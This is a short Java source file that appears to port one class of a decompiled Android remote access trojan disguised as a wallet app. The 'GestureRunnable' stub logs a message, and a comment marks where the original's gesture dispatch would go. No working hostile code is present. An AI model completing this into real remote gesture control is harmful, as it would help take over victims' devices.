package com.vendor.rat.helper;

import android.util.Log;

/**
 * Vendor: com.guard.wallet.helper.h
 * Runnable that dispatches gesture/swipe operations.
 * All modes delegate to utils.g.S() for gesture execution.
 */
public final class GestureRunnable implements Runnable {

    public final int mode;
    public final long duration;
    public final Object[] points;

    public GestureRunnable(long duration, Object[] points, int mode) {
        this.mode = mode;
        this.duration = duration;
        this.points = points;
    }

    @Override
    public final void run() {
        // ADAPT: vendor calls com.guard.wallet.utils.g.S(10L, Long.valueOf(duration), points)
        // TODO: VENDOR_VERIFY - gesture dispatch implementation
        Log.d("GestureRunnable", "run mode=" + mode + " duration=" + duration);
    }
}
